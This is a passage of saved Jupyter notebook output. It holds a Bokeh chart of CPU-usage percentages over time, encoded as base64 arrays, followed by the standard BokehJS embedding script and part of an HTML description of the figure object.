AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFyPwvUofptAFK5H4XqYdEAzMzMzM4+DQFyPwvUovpZA\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[360]},\"Time\":{\"__ndarray__\":\"AAAAl+ctd0IAAOgF6y13QgAA0HTuLXdCAAC44/Etd0IAAKBS9S13QgAAiMH4LXdCAABwMPwtd0IAAFif/y13QgAAQA4DLndCAAAofQYud0IAABDsCS53QgAA+FoNLndCAADgyRAud0IAAMg4FC53QgAAsKcXLndCAACYFhsud0IAAICFHi53QgAAaPQhLndCAABQYyUud0IAADjSKC53QgAAIEEsLndCAAAIsC8ud0IAAPAeMy53QgAA2I02LndCAADA/Dkud0IAAKhrPS53QgAAkNpALndCAAB4SUQud0IAAGC4Ry53QgAASCdLLndCAAAwlk4ud0IAABgFUi53QgAAAHRVLndCAADo4lgud0IAANBRXC53QgAAuMBfLndCAACgL2Mud0IAAIieZi53QgAAcA1qLndCAABYfG0ud0IAAEDrcC53QgAAKFp0LndCAAAQyXcud0IAAPg3ey53QgAA4KZ+LndCAADIFYIud0IAALCEhS53QgAAmPOILndCAACAYowud0IAAGjRjy53QgAAUECTLndCAAA4r5Yud0IAACAemi53QgAACI2dLndCAADw+6Aud0IAANhqpC53QgAAwNmnLndCAACoSKsud0IAAJC3ri53QgAAeCayLndCAABglbUud0IAAEgEuS53QgAAMHO8LndCAAAY4r8ud0IAAABRwy53QgAA6L/GLndCAADQLsoud0IAALidzS53QgAAoAzRLndCAACIe9Qud0IAAHDq1y53QgAAWFnbLndCAABAyN4ud0IAACg34i53QgAAEKblLndCAAD4FOkud0IAAOCD7C53QgAAyPLvLndCAACwYfMud0IAAJjQ9i53QgAAgD/6LndCAABorv0ud0IAAFAdAS93QgAAOIwEL3dCAAAg+wcvd0IAAAhqCy93QgAA8NgOL3dCAADYRxIvd0IAAMC2FS93QgAAqCUZL3dCAACQlBwvd0IAAHgDIC93QgAAYHIjL3dCAABI4SYvd0IAADBQKi93QgAAGL8tL3dCAAAALjEvd0IAAOicNC93QgAA0As4L3dCAAC4ejsvd0IAAKDpPi93QgAAiFhCL3dCAABwx0Uvd0IAAFg2SS93QgAAQKVML3dCAAAoFFAvd0IAABCDUy93QgAA+PFWL3dCAADgYFovd0IAAMjPXS93QgAAsD5hL3dCAACYrWQvd0IAAIAc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\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[360]},\"Type\":[\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\",\"% CPU\"],\"color\":[\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\",\"#440154\"],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359],\"y_index\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]},\"selected\":{\"id\":\"5014\"},\"selection_policy\":{\"id\":\"5013\"}},\"id\":\"5002\",\"type\":\"ColumnDataSource\"}],\"root_ids\":[\"4968\"]},\"title\":\"Bokeh Application\",\"version\":\"2.1.1\"}};\n",
       "  var render_items = [{\"docid\":\"b4632373-7484-422f-a550-d2bd9a0a7b5a\",\"root_ids\":[\"4968\"],\"roots\":{\"4968\":\"da7a5e15-3093-48f4-a23d-16053db8a98c\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "4968"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div style=\"display: table;\"><div style=\"display: table-row;\"><div style=\"display: table-cell;\"><b title=\"bokeh.plotting.figure.Figure\">Figure</b>(</div><div style=\"display: table-cell;\">id&nbsp;=&nbsp;'4968', <span id=\"5249\" style=\"cursor: pointer;\">&hellip;)</span></div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">above&nbsp;=&nbsp;[],</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">align&nbsp;=&nbsp;'start',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">aspect_ratio&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">aspect_scale&nbsp;=&nbsp;1,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">background&nbsp;=&nbsp;None,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">background_fill_alpha&nbsp;=&nbsp;1.0,</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">background_fill_color&nbsp;=&nbsp;'#ffffff',</div></div><div class=\"5248\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: 